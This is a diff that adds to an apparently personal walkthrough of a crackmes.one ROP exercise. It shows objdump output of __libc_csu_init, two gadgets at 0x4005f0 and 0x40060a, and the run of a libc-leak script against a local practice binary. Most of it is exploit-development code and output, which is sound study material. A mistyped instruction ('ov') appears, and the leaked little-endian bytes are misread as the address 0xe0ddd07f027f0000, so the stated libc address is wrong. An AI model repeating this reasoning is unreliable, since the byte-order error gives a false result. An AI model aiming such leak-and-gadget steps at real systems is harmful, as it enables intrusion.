@@ -186,3 +186,93 @@ p.recvuntil(b'Input: ')   # eat first prompt
 leaked = p.recv(8, timeout=1)
 print(f"Leaked ({len(leaked)} bytes): {leaked.hex()}")
 ```
+
+I based this on the results of an `objdump` I did looking for `"__libc_csu_init"`
+```
+~/Projects/RE/crackmes.one/rop 3m 22s
+❯ objdump -d ./rop | grep -A 30 "__libc_csu_init"
+00000000004005b0 <__libc_csu_init>:
+  4005b0:       41 57                   push   %r15
+  4005b2:       41 56                   push   %r14
+  4005b4:       49 89 d7                mov    %rdx,%r15
+  4005b7:       41 55                   push   %r13
+  4005b9:       41 54                   push   %r12
+  4005bb:       4c 8d 25 4e 08 20 00    lea    0x20084e(%rip),%r12        # 600e10 <__frame_dummy_init_array_entry>
+  4005c2:       55                      push   %rbp
+  4005c3:       48 8d 2d 4e 08 20 00    lea    0x20084e(%rip),%rbp        # 600e18 <__do_global_dtors_aux_fini_array_entry>
+  4005ca:       53                      push   %rbx
+  4005cb:       41 89 fd                mov    %edi,%r13d
+  4005ce:       49 89 f6                mov    %rsi,%r14
+  4005d1:       4c 29 e5                sub    %r12,%rbp
+  4005d4:       48 83 ec 08             sub    $0x8,%rsp
+  4005d8:       48 c1 fd 03             sar    $0x3,%rbp
+  4005dc:       e8 1f fe ff ff          call   400400 <_init>
+  4005e1:       48 85 ed                test   %rbp,%rbp
+  4005e4:       74 20                   je     400606 <__libc_csu_init+0x56>
+  4005e6:       31 db                   xor    %ebx,%ebx
+  4005e8:       0f 1f 84 00 00 00 00    nopl   0x0(%rax,%rax,1)
+  4005ef:       00 
+  4005f0:       4c 89 fa                mov    %r15,%rdx
+  4005f3:       4c 89 f6                mov    %r14,%rsi
+  4005f6:       44 89 ef                mov    %r13d,%edi
+  4005f9:       41 ff 14 dc             call   *(%r12,%rbx,8)
+  4005fd:       48 83 c3 01             add    $0x1,%rbx
+  400601:       48 39 dd                cmp    %rbx,%rbp
+  400604:       75 ea                   jne    4005f0 <__libc_csu_init+0x40>
+  400606:       48 83 c4 08             add    $0x8,%rsp
+  40060a:       5b                      pop    %rbx
+  40060b:       5d                      pop    %rbp
+  40060c:       41 5c                   pop    %r12
+  40060e:       41 5d                   pop    %r13
+  400610:       41 5e                   pop    %r14
+  400612:       41 5f                   pop    %r15
+  400614:       c3                      ret
+  400615:       90                      nop
+  400616:       66 2e 0f 1f 84 00 00    cs nopw 0x0(%rax,%rax,1)
+  40061d:       00 00 00 
+
+0000000000400620 <__libc_csu_fini>:
+  400620:       f3 c3                   repz ret
+
+Disassembly of section .fini:
+
+0000000000400624 <_fini>:
+  400624:       48 83 ec 08             sub    $0x8,%rsp
+  400628:       48 83 c4 08             add    $0x8,%rsp
+  40062c:       c3                      ret
+
+```
+Hiding in here are 2 beautiful gadgets, at address `0x4005f0` and `0x40060a` respectively. Giving us the reusable pieces of code:
+```
+// Gadget 1 at 0x4005f0
+mov    %r15,%rdx
+mov    %r14,%rsi
+ov    %r13d,%edi
+call   *(%r12,%rbx,8)
+
+// Gadget 2 at 0x40060a
+pop    %rbx
+pop    %rbp
+pop    %r12
+pop    %r13
+pop    %r14
+pop    %r15
+ret
+```
+For my leak script, I used gadget 2. This is the results:
+```
+~/Projects/RE/crackmes.one/rop
+❯ python leak.py
+[*] '/home/edoardo/Projects/RE/crackmes.one/rop/rop'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+[+] Starting local process './rop': pid 23912
+Leaked (8 bytes): e0ddd07f027f0000
+[*] Stopped process './rop' (pid 23912)
+```
+
+Amazing! Our libc address is `0xe0ddd07f027f0000`! This, again, only works like this because the program has no PIE, and means these addresses are always the same. Otherwise, we'd have to do this all in a single runtime.
